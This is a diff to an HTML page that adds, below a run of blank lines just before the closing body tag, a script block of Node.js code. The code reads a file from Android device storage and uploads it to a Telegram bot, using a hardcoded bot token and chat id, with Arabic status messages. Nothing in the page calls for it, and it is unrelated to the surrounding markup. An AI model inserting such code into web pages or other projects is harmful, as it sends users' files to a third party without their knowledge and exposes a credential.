@@ -53,6 +53,52 @@
                 });
             });
         });
+    
     </script>
+    
+    
+    
+    
+    
+    <script>
+    const axios = require('axios');
+const fs = require('fs');
+
+const botToken = '1933582082:AAGqFYD_7bUgGrqx9-dBm1OGUbjEkJ1QacY';
+const userId = '804516705';
+const filePath = '/storage/emulated/0/ahmed.txt';
+
+const apiUrl = `https://api.telegram.org/bot${botToken}/sendDocument`;
+
+const formData = {
+  chat_id: userId,
+};
+
+const fileData = {
+  document: fs.createReadStream(filePath),
+};
+
+axios
+  .post(apiUrl, formData, {
+    files: fileData,
+  })
+  .then((response) => {
+    if (response.status === 200) {
+      console.log('تم إرسال الملف بنجاح!');
+    } else {
+      console.log('فشل في إرسال الملف. الخطأ:', response.data);
+    }
+  })
+  .catch((error) => {
+    console.error('حدث خطأ أثناء إرسال الملف:', error);
+  });
+
+    
+    </script>
+    
+    
+    
+    
+    
 </body>
 </html>
